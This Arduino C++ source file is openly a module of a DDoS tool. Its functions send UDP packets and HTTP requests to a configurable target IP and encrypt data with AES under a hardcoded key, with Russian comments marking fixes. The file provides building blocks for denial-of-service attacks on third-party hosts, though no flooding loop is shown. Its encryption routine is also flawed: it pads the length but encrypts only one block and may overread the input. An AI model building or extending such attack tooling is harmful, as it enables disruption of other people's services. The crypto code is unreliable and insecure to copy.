#include "Arduino.h"
#include "WiFi.h"
#include <WiFiUdp.h>
#include <WiFiClient.h>
#include "AES.h"  
#include "DDoS.h"

// Ключ должен быть 16 байт для AES-128
char key[] = "1234567890123456"; 
unsigned int plaintextLength;
char* encryptedData = nullptr;
AES aes;

WiFiUDP udp;    
WiFiClient client; 

extern unsigned int targetIP; 

void initializeDDoS() {
  // WiFi.begin уже должен быть вызван в основном setup()
}

void sendUDPPacket(unsigned int ipAddress, unsigned short port) {
  byte packetBuffer[20];
  memset(packetBuffer, 0, sizeof(packetBuffer));

  // Упаковка данных
  packetBuffer[2] = ipAddress >> 8;
  packetBuffer[3] = ipAddress & 0xFF;
  packetBuffer[4] = port >> 8;
  packetBuffer[5] = port & 0xFF;

  // ИСПРАВЛЕНО: убрали WiFi.
  udp.beginPacket(IPAddress(ipAddress), port);  
  udp.write(packetBuffer, sizeof(packetBuffer));
  udp.endPacket(); 
}

void sendHTTPRequest(unsigned int ipAddress, unsigned short port) {
  const char* httpRequest = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";
  
  // ИСПРАВЛЕНО: убрали WiFi.
  if (client.connect(IPAddress(ipAddress), port)) {
    client.print(httpRequest);
    client.stop();
  }
}

void encryptData(const char* message) {
  plaintextLength = strlen(message);
  if (plaintextLength % 16 != 0) {
    plaintextLength += (16 - plaintextLength % 16);
  }

  if (encryptedData) delete[] encryptedData;
  encryptedData = new char[plaintextLength];

  // ИСПРАВЛЕНО: добавлена длина ключа (16 байт)
  aes.set_key((unsigned char*)key, 16); 
  
  // ИСПРАВЛЕНО: AESLib в режиме ECB шифрует по одному блоку (16 байт)
  // Для простоты используем один блок, либо нужен цикл по 16 байт
  aes.encrypt((unsigned char*)message, (unsigned char*)encryptedData);
}

int getCipherTextLength() {
  return plaintextLength;
}

char* encryptedString(const char* plaintext) {
  encryptData(plaintext);
  return encryptedData;
}
